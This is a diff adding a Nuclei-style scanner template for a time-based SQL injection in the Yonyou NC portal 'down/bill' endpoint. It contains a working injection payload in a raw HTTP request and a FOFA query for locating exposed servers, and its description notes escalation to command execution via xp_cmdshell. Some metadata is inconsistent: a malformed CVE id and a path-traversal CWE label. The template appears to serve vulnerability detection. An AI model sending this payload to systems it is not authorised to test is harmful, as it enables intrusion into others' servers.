@@ -1,0 +1,44 @@
+id: 2024-105082118
+
+info:
+  name: 用友NC系统网报down-bill接口的sql注入漏洞
+  author: k3ppf0r
+  severity: high
+  description: |
+    用友NC //portal/pt/erfile/down/bill接口的id参数存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
+  reference:
+    - https://github.com/wy876/POC/blob/437fad5c987d7a15441fd5e05cb793b08181809b/%E7%94%A8%E5%8F%8BNC-bill%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+    - https://security.yonyou.com/#/noticeInfo?id=544
+  remediation: |
+    打对应补丁，重启服务，各版本补丁获取方式如下：
+    1.NC65方案
+    补丁名称：patch_65_portal_down的sql注入安全漏洞修复
+    补丁编码：NCM_NC6.5_000_109902_20240428_GP_266284425
+    校验码：
+    e2fddcaa75eb3e5d15ca4a72700e55712aca9eaa32ca90ce3b2c85d3b3447958
+  classification:
+    cve-id: 2024-105082118
+    cvss-score: 7.7
+    cwe-id: CWE-22
+  metadata:
+    date: 2024-04-28
+    version: 用友NC65
+    fofa-query: icon_hash="1085941792" && body="/logo/images/logo.gif"
+  tags: yonyou,sqli,1day,yonyounc,nc65
+
+
+http:
+  - raw:
+    - |
+      @timeout: 10s
+      GET /portal/pt/erfile/down/bill?pageId=login&id=1'+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),4)-- HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+      Accept-Charset: utf-8
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration>=4
+          - status_code == 500
+        condition: and
